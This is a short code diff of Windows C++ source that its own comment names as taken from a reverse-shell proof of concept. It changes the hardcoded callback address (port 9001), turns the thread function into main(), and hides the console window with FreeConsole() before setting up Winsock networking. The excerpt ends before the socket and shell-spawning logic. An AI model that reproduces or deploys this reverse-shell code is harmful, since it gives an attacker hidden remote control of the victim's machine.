@@ -1,5 +1,4 @@
 // All this code was gracefully stolen from https://github.com/tudorthe1ntruder/reverse-shell-poc/ <3
-#include "pch.h"
 #include <stdio.h>
 #include <string>
 #include <process.h>
@@ -7,8 +6,8 @@
 #include <ws2tcpip.h>
 #pragma comment(lib, "Ws2_32.lib")
 
-DWORD WINAPI asdf(__in LPVOID lpParam){
-	char REMOTE_ADDR[] = "169.254.239.84";
+int main(void){
+	char REMOTE_ADDR[] = "169.254.168.95";
 	char REMOTE_PORT[] = "9001";
 	FreeConsole();
 	WSADATA wsaData;
